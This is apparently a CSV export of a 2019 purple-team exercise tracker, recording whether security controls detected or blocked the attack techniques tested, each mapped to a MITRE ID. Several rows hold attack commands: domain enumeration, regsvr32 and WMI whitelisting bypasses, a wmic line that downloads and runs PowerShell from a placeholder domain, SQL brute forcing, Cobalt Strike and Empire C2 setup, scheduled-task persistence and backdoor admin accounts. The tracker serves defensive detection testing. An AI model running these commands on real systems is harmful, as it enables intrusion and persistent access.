Enterprise Purple – 2019 Q1,Windows Domain Enumeration,Discovery,Domain Enumeration - BloodHound,T1018,,Domain Enumeration,Completed,Detected,High,TBD,Yes,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) Windows utilities used for enumeration are detected by EDR and/or SIEM rules",,,"SIEM,EDR,Behavior Analytics","DoDonpachi,Progear",2019-01-16T23:01:14.197Z,1547679674197,2019-01-16T23:39:00.197Z,1547681940197,2019-01-28T22:26:12.351Z,1548714372351,Security Risk Advisors,,"Use Bloodhound/Sharphound to preform queries across the local domain.

- Domain Group Memberships
- Domain Trusts
- Local Admins
- Sessions","Using SharpHound.ps1:
Invoke-BloodHound

Using SharpHound.exe:
SharpHound.exe",,High,Low,Internal,High,,,,
Enterprise Purple – 2019 Q1,Windows Domain Enumeration,Discovery,Domain Enumeration - LDAP using PowerShell,T1059.001,,Domain Enumeration,Completed,Detected,Info,TBD,No,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) Legacy Windows and native PowerShell commands used for enumeration are detected by EDR and/or SIEM rules",,,"SIEM,EDR,Behavior Analytics","DoDonpachi,Progear",2019-01-16T18:30:59.197Z,1547663459197,2019-01-16T20:13:50.197Z,1547669630197,2019-01-28T22:25:59.060Z,1548714359060,Security Risk Advisors,,Use PowerView v3 to perform queries against the Windows domain for common groups.,"List All Admins:
Get-DomainGroupMember -Identity ""Administrators"" -Domain [FQDN] -Recurse | select MemberName | fl",,High,Low,Internal,High,,,,PowerView
Enterprise Purple – 2019 Q1,Windows Domain Enumeration,Discovery,Domain Enumeration - NSlookup,T1018,,Domain Enumeration,Completed,NotDetected,TBD,TBD,No,,"1) Large number of scripted nslookup commands potentially detected by EDR and/or SIEM solution, or behavioral monitoring tool",,,"SIEM,EDR,Behavior Analytics",,2019-01-17T01:57:39.197Z,1547690259197,2019-01-17T02:35:34.197Z,1547692534197,2019-01-17T03:31:48.197Z,1547695908197,Security Risk Advisors,,"Leverage the builtin ""nslookup"" command to perform queries against the local DNS servers for specific server information.","DNS Servers: nslookup -type=NS [FQDN]
Domain Controllers: nslookup -type=SRV _ldap._tcp.[FQDN]",,High,Low,Internal,High,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Windows Domain Enumeration,Discovery,Domain Enumeration - NET,T1087,,Domain Enumeration,Completed,Detected,Low,TBD,No,,"1) Windows enumeration activities detected from large amount of network traffic (SMB, ARP requests) from UEBA or network monitoring tools,2) EDR and/or SIEM rules are configured to detect use of native commands such as 'net' and modern PowerShell equivalents",,,"SIEM,EDR,Behavior Analytics",DoDonpachi,2019-01-16T14:57:45.197Z,1547650665197,2019-01-16T15:39:40.197Z,1547653180197,2019-01-28T22:25:38.856Z,1548714338856,Security Risk Advisors,,"Leverage the builtin ""net"" command to perform queries against the Windows domain for common groups.","Domain Controllers:
net group ""Domain Controllers"" /domain

Domain Admins:
net group ""Domain Admins"" /domain

Administrators of the Domain:
net localgroup ""Administrators"" /domain",,High,Low,Internal,High,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Process Creation Using PowerShell,T1059.001,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2019-01-12T16:36:23.197Z,1547310983197,2019-01-12T18:00:57.197Z,1547316057197,2019-01-28T22:12:18.597Z,1548713538597,Security Risk Advisors,,Spawn a new process using PowerShell.,powershell.exe <run command>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Process Creation Using WMI Format Table,T1047,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",DoDonpachi,2019-01-13T17:32:08.197Z,1547400728197,2019-01-13T19:12:29.197Z,1547406749197,2019-01-28T22:19:38.855Z,1548713978855,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with WMI Format Table (Squiblytoo).,wmic os get /format:<url to xsl file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Process Creation Using MSBuild,,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",,2019-01-13T04:37:29.197Z,1547354249197,2019-01-13T06:07:04.197Z,1547359624197,2019-01-13T06:31:24.197Z,1547361084197,Security Risk Advisors,,Spawn a new process using MSBuild.,msbuild.exe <path to xml file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Process Creation Using HTA,T1218.005,,Trusted Windows Binary,Completed,Blocked,TBD,Yes,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",Ketsui,2019-01-12T13:38:41.197Z,1547300321197,2019-01-12T14:02:15.197Z,1547301735197,2019-01-12T14:51:38.197Z,1547304698197,Security Risk Advisors,,Spawn a new process using HTA.,mshta <full path to hta>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Process Creation Using Regsvr32,T1218.010,,Trusted Windows Binary,Completed,Detected,High,Yes,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2019-01-12T10:41:39.197Z,1547289699197,2019-01-12T12:38:49.197Z,1547296729197,2019-01-29T07:54:41.882Z,1548748481882,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with Regsvr32 (Squiblydoo).,regsvr32 /s /n /u /i:<path to scriptlet> scrobj.dll,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Process Creation Using WMI,T1047,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2019-01-12T19:50:10.197Z,1547322610197,2019-01-12T20:26:32.197Z,1547324792197,2019-01-28T22:12:39.584Z,1548713559584,Security Risk Advisors,,Spawn a new process using WMI.,"wmic process call create ""powershell -nop -c 'IEX ((new-object net.webclient).downloadstring(https://somedomain/1234))'""",,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Process Creation Using VBS,T1059.004,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2019-01-13T02:25:44.197Z,1547346344197,2019-01-13T03:34:13.197Z,1547350453197,2019-01-28T22:19:13.021Z,1548713953021,Security Risk Advisors,,Spawn a new process using VBS.,cscript <path to vbs file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Obfuscated Commands - PowerShell,T1059.001,,Trusted Windows Binary,Completed,Detected,High,Yes,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2019-01-13T07:35:26.197Z,1547364926197,2019-01-13T09:31:47.197Z,1547371907197,2019-01-29T08:19:58.571Z,1548749998571,Security Risk Advisors,,Run an obfuscated PowerShell command to run a malicious command.,invoke-obfuscation -> run command,,Low,Low,Internal,Low,,,,PowerShell
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Obfuscated Commands - CMD,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,,,,"EDR,Endpoint Protection",,2019-01-13T10:25:29.197Z,1547375129197,2019-01-13T11:18:24.197Z,1547378304197,2019-01-13T12:02:20.197Z,1547380940197,Security Risk Advisors,,Run an obfuscated CMD command to run a malicious command.,invoke-dosfuscation -> run command,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,Process Creation Using JS,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",,2019-01-12T22:54:22.197Z,1547333662197,2019-01-12T23:52:55.197Z,1547337175197,2019-01-13T00:58:31.197Z,1547341111197,Security Risk Advisors,,Spawn a new process using JS.,cscript <path to js file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Suspicious Process Execution,Exploitation,PowerShell Downgrade,T1059.001,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2019-01-13T13:20:40.197Z,1547385640197,2019-01-13T14:58:29.197Z,1547391509197,2019-01-28T22:15:15.607Z,1548713715607,Security Risk Advisors,,Execute PowerShell in a degraded version to avoid security controls in newer versions.,powershell.exe -v 2,,Low,Low,Internal,Low,,,,PowerShell
Enterprise Purple – 2019 Q1,Database Assault,Exploitation,Fingerprint and brute force MS SQL Server instances,T1110,,Database exploitation,Completed,Detected,High,TBD,TBD,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by SIEM or Database Activity Monitoring tool",,,SIEM,Progear,2019-01-18T16:24:18.197Z,1547828658197,2019-01-18T18:12:29.197Z,1547835149197,2019-01-18T18:21:09.197Z,1547835669197,Security Risk Advisors,,Attempt to exploit insecurely configured MS SQL Server databases on the network.,"Metasploit recon:
use auxiliary/scanner/mssql/mssql_ping

Nmap recon:
nmap -p 445 --script ms-sql-info <host>

Nmap brute force:
nmap -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=customuser.txt,passdb=custompass.txt <host>
nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt <host>",,High,High,Internal,Low,,,,"Nmap,SQLping3,Metasploit"
Enterprise Purple – 2019 Q1,Database Assault,Discovery,"Internal - Moderate Port Scan with 5 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,Detected,Med,TBD,Yes,,"1) Internal port scanning activity detect by potential firewall/IDS/IPS, UEBA tool, or honeypot technology",,,"Firewall,Behavior Analytics",Batrider,2019-01-18T13:22:26.197Z,1547817746197,2019-01-18T14:52:00.197Z,1547823120197,2019-01-28T22:29:24.849Z,1548714564849,Security Risk Advisors,,Identify open ports and services for common DBMS platforms,,,High,Low,Both,Low,,,,Nmap
Enterprise Purple – 2019 Q1,Database Assault,Exploitation,Fingerprint and brute force MySQL databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,SIEM,,2019-01-18T18:43:23.197Z,1547837003197,2019-01-18T19:45:07.197Z,1547840707197,2019-01-18T20:39:07.197Z,1547843947197,Security Risk Advisors,,Attempt to exploit insecurely configured MySQL databases on the network.,,,High,High,Internal,Low,,,,"Nmap,Metasploit"
Enterprise Purple – 2019 Q1,Database Assault,Exploitation,Fingerprint and brute force DB2 databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,SIEM,,2019-01-19T00:02:33.197Z,1547856153197,2019-01-19T01:31:10.197Z,1547861470197,2019-01-19T02:48:53.197Z,1547866133197,Security Risk Advisors,,Attempt to exploit insecurely configured IBM DB2 databases on the network.,"nmap -sS -Pn -p1433,1521,1526,3306,523 --randomize-hosts -g 53 --open --script=broadcast-ms-sql-discover.nse,broadcast-db2-discover.nse,ms-sql-empty-password.nse,mysql-empty-password.nse, -oA output IPADDRESS",,High,High,Internal,Low,,,,"Nmap,Metasploit"
Enterprise Purple – 2019 Q1,Database Assault,Exploitation,Fingerprint and brute force Oracle databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,SIEM,,2019-01-18T22:32:55.197Z,1547850775197,2019-01-18T23:09:31.197Z,1547852971197,2019-01-18T23:19:44.197Z,1547853584197,Security Risk Advisors,,Attempt to exploit insecurely configured Oracle databases on the network.,,,High,High,Internal,Low,,,,"Oscanner,Nmap,Metasploit"
Enterprise Purple – 2019 Q1,Database Assault,Exfiltration,Pilfer sensitive data from compromised DBs,,,Database access,Completed,NotDetected,TBD,TBD,Yes,,"1) SIEM rules are configured to alert on suspicious logons to critical DB servers and databases.,2) Database activity monitoring tool or triggers are configured for highly sensitive DB tables and columns.,3) DLP tool successfully detects sensitive data movement from the server or leaving the network.",,,"DLP,SIEM",,2019-01-19T03:17:27.197Z,1547867847197,2019-01-19T04:20:09.197Z,1547871609197,2019-01-19T05:06:17.197Z,1547874377197,Security Risk Advisors,,Pilfer sensitive data from compromised DBs and send it outside the network.,,,Medium,High,Both,Medium,,,,
Enterprise Purple – 2019 Q1,C2 Channels,Command & Control,Cobalt Strike Default Beacon HTTP payload over tcp/80,T1571,,C2 channel,Completed,Detected,High,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics","MUSHA,Grind Stormer,Batrider",2019-01-11T13:48:44.197Z,1547214524197,2019-01-11T14:16:03.197Z,1547216163197,2019-01-28T22:06:45.177Z,1548713205177,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.",Create a http listener,,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,C2 Channels,Command & Control,Cobalt Strike Default Beacon HTTPS payload over tcp/443,T1571,,C2 channel,Completed,Detected,High,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics","MUSHA,Batrider",2019-01-11T17:33:51.197Z,1547228031197,2019-01-11T18:23:42.197Z,1547231022197,2019-01-28T22:07:13.358Z,1548713233358,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Install SSL Certs From Lets Encrypt onto the server

Create a https listener",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,C2 Channels,Command & Control,Beacon DNS over udp/53,T1571,,C2 channel,Completed,Blocked,TBD,No,No,,"1) SIEM rules are configured to detect and alert on suspicious DNS traffic,12 Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Firewall,EDR,Secure Baselines,Behavior Analytics",MUSHA,2019-01-12T04:29:25.197Z,1547267365197,2019-01-12T06:22:53.197Z,1547274173197,2019-01-28T22:08:43.441Z,1548713323441,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Purchase a domain name

Create a windows/beacon_dns/reverse_dns_txt listener",,Medium,High,Both,High,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,C2 Channels,Command & Control,Cobalt Strike Custom Beacon HTTP payload over tcp/80,T1095,,C2 channel,Completed,Detected,Low,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics",Batrider,2019-01-11T20:54:12.197Z,1547240052197,2019-01-11T21:57:10.197Z,1547243830197,2019-01-28T22:07:38.002Z,1548713258002,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Create malleable c2 profile

./teamserver [external IP] [password] [/path/to/my.profile]",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,C2 Channels,Command & Control,Cobalt Strike Custom Beacon HTTPS payload over tcp/443,T1095,,C2 channel,Completed,Detected,Low,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics",Batrider,2019-01-11T23:12:09.197Z,1547248329197,2019-01-11T23:44:46.197Z,1547250286197,2019-01-28T22:07:56.393Z,1548713276393,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Create malleable c2 profile

./teamserver [external IP] [password] [/path/to/my.profile]",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,C2 Channels,Command & Control,Cobalt Strike Default Beacon SMB over tcp/445,T1571,,C2 channel,Completed,Blocked,TBD,No,TBD,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.,2) Suspicious SMB netconns and pivoting from internal systems is detected by EDR or behavioral tools. Examples may include unusual SMB connections from domain controllers and other critical assets.",,,"Firewall,EDR,Behavior Analytics",MUSHA,2019-01-12T06:53:15.197Z,1547275995197,2019-01-12T07:22:08.197Z,1547277728197,2019-01-12T07:39:14.197Z,1547278754197,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various SMB.",Generate default SMB beacon using cobalt strike,,Medium,High,Internal,Medium,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,C2 Channels,Command & Control,Empire Default Beacon HTTP payload over tcp/80,T1571,,C2 channel,Completed,Detected,High,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,EDR,Behavior Analytics","MUSHA,Grind Stormer",2019-01-12T01:48:23.197Z,1547257703197,2019-01-12T02:03:32.197Z,1547258612197,2019-01-28T22:08:21.082Z,1548713301082,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","uselistener http

Stageless:
launchers <powershell or python> <listener name>

Staged:
usestager <stager-option>
set <option-name> <option-value>
execute",,Medium,High,Both,Medium,,,,Empire
Enterprise Purple – 2019 Q1,C2 Channels,Discovery,Egress Buster,T1046,,Network egress checks,Completed,Detected,Low,TBD,Yes,,1) Egress busting scan is detected by IDS/IPS or firewall,,,"Web Gateway,Firewall,Secure Baselines","MUSHA,Batrider",2019-01-12T08:05:32.197Z,1547280332197,2019-01-12T08:37:19.197Z,1547282239197,2019-01-28T22:09:31.518Z,1548713371518,Security Risk Advisors,,"Identify allowed egress services and ports, including all TCP ports and common UDP ports.",,,Low,Low,Internal,Low,,,,Egress Buster
Enterprise Purple – 2019 Q1,Endpoint Persistence,Persistence,Use of schtasks.exe for persistent jobs,T1053,,Scheduled tasks,Completed,Detected,Med,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows task scheduler events,,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2019-01-14T05:32:37.197Z,1547443957197,2019-01-14T07:19:22.197Z,1547450362197,2019-01-28T22:16:48.118Z,1548713808118,Security Risk Advisors,,Create a scheduled task,"schtasks /Create /SC DAILY /TN ""Malicious Task"" /TR ""C:MaliciousFile.bat"" /ST 09:00",,Medium,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence using .BAT file,T1547.001,,Registry Modification,Completed,Blocked,TBD,Yes,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Ketsui,2019-01-14T03:00:17.197Z,1547434817197,2019-01-14T03:18:30.197Z,1547435910197,2019-01-14T04:23:47.197Z,1547439827197,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Endpoint Persistence,Persistence,Use of sc.exe to create rogue service to maintain access,T1543.003,,Rogue Service Creation,Completed,Detected,High,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows service creation events,,,"SIEM,EDR,Endpoint Protection","DoDonpachi,Progear",2019-01-13T21:46:43.197Z,1547416003197,2019-01-13T22:11:07.197Z,1547417467197,2019-01-28T22:16:14.512Z,1548713774512,Security Risk Advisors,,Modification of the registry startup keys to launch a rogue service.,,,Low,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Endpoint Persistence,Persistence,Use of WMI Subscription for persistent jobs,T1546.003,,Windows Management Instrumentation,Completed,Detected,High,TBD,No,,1) EDR and/or SIEM rules are configured to detect suspicious WMI execution,,,"SIEM,EDR,Endpoint Protection",DoDonpachi,2019-01-14T10:25:29.197Z,1547461529197,2019-01-14T11:18:05.197Z,1547464685197,2019-01-28T22:18:29.715Z,1548713909715,Security Risk Advisors,,Establish persistence using WMI event subscriptions.,"Create a one liner payload
cat payload.txt | iconv --to-code=UTF-16LE | base64 -w 0

Red team → Persistence → WMI Event Persistence using PowerShell",https://github.com/harleyQu1nn/AggressorScripts/tree/master/Persistence,Medium,Medium,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2019 Q1,Endpoint Persistence,Persistence,Create a Local Administrator User on Server,T1136,,Backdoor Accounts,Completed,Detected,High,TBD,Yes,,"1) EDR tool alerts on suspicious use of Windows 'net user' and similar commands,2) SIEM alerts on local and domain user and group creation and modifications",,,"SIEM,EDR",Progear,2019-01-14T08:16:50.197Z,1547453810197,2019-01-14T08:19:03.197Z,1547453943197,2019-01-28T22:17:08.140Z,1548713828140,Security Risk Advisors,,Create a Local administrator user after the compromise of a system.,"net user /add [username] [password]
new localgroup administrators [username] /add",,Medium,High,Internal,Low,,,,
Enterprise Purple – 2019 Q1,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence,T1547.001,,Registry Modification,Completed,Blocked,TBD,Yes,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Ketsui,2019-01-14T00:28:24.197Z,1547425704197,2019-01-14T00:34:18.197Z,1547426058197,2019-01-14T01:50:38.197Z,1547430638197,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2019 Q1,Physical Access,Exploitation,Laptop or workstation boot attack,T1091,,Workstation Local Attack,Completed,Blocked,TBD,No,TBD,,,,,Secure Baselines,Secure Configs,2019-01-15T01:06:11.197Z,1547514371197,2019-01-15T01:53:09.197Z,1547517189197,2019-01-15T03:23:43.197Z,1547522623197,Security Risk Advisors,,Attempt cold boot on laptops with missing or partial FDE,Load kali on boot-able usb,,Low,High,Both,Medium,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Physical Access,Exploitation,Locked workstation attack,T1200,,Workstation Local Attack,Completed,NotDetected,TBD,TBD,No,,1) Payload run from bashbunny device is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines",,2019-01-14T14:03:57.197Z,1547474637197,2019-01-14T14:45:58.197Z,1547477158197,2019-01-14T15:26:59.197Z,1547479619197,Security Risk Advisors,,"Setup rogue DHCP server and connect to laptop in locked state, intercept credentials using Responder tool.",Use bashbunny with responder loaded,,Low,High,Both,Medium,,,,"Responder,Manual Techniques"
Enterprise Purple – 2019 Q1,Physical Access,Exploitation,USB Rubby Ducky,T1091,,Workstation Local Attack,Completed,Blocked,TBD,Yes,No,,1) Payload from rubber ducky is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines",Ketsui,2019-01-14T21:03:58.197Z,1547499838197,2019-01-14T22:56:44.197Z,1547506604197,2019-01-28T22:20:58.185Z,1548714058185,Security Risk Advisors,,Attack local laptop/workstation using USB device to execute malicious code.,cmd /c \\<share>\<folder>\file.bat,,Medium,High,Internal,High,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2019 Q1,Physical Access,Exploitation,Mouse Jacking,T1200,,Wireless Attack,Completed,Detected,Med,TBD,No,,1) Established C2 payload from mouse jacker payload is detected by EDR tool and/or SIEM events.,,,"SIEM,EDR,Secure Baselines",DoDonpachi,2019-01-14T17:17:31.197Z,1547486251197,2019-01-14T18:27:37.197Z,1547490457197,2019-01-28T22:20:27.808Z,1548714027808,Security Risk Advisors,,Attack local laptop via preexisting vulnerable USB mouse dongle.,jackit --script <Ducky_Script>,,Low,High,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike,JackIt"
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,10 - Macro - MSBuild,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-06T08:59:12.197Z,1546765152197,2019-01-06T09:03:29.197Z,1546765409197,2019-01-28T21:54:19.052Z,1548712459052,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,16 - Archive - DDE,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,No,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-05T11:22:39.197Z,1546687359197,2019-01-05T11:35:24.197Z,1546688124197,2019-01-28T21:55:52.143Z,1548712552143,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,3 - Macro - Cobalt Strike Standard as HREF (URL Rewrite Update),T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-05T23:46:55.197Z,1546732015197,2019-01-06T01:24:17.197Z,1546737857197,2019-01-06T02:04:15.197Z,1546740255197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,8 - Macro - MMG WMI PowerShell,T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-06T15:18:22.197Z,1546787902197,2019-01-06T17:11:53.197Z,1546794713197,2019-01-06T17:15:49.197Z,1546794949197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,15 - Archive - Macro,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Slap Fight,2019-01-07T05:45:26.197Z,1546839926197,2019-01-07T07:28:06.197Z,1546846086197,2019-01-07T08:22:31.197Z,1546849351197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar malicious document and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2019 Q1,Email With Malicious Attachments,Delivery,14 - Macro - Remote Template,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2019-01-05T07:37:28.197Z,1546673848197,2019-01-05T07:59:06.197Z,1546675146197,2019-01-05T09:56:03.197Z,1546682163197,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
